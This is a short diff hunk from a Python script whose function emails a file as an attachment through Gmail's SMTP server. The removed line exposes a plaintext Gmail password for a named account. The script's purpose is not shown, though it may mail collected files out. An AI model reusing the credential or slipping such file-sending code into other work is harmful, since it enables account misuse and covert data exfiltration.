@@ -20,7 +20,7 @@ def send_to_gmail(file):
     msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
 
     with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
-        smtp.login('OSINT48@gmail.com', 'anticheat465')
+        smtp.login('OSINT48@gmail.com', '')
         smtp.send_message(msg)
 
 def process1():
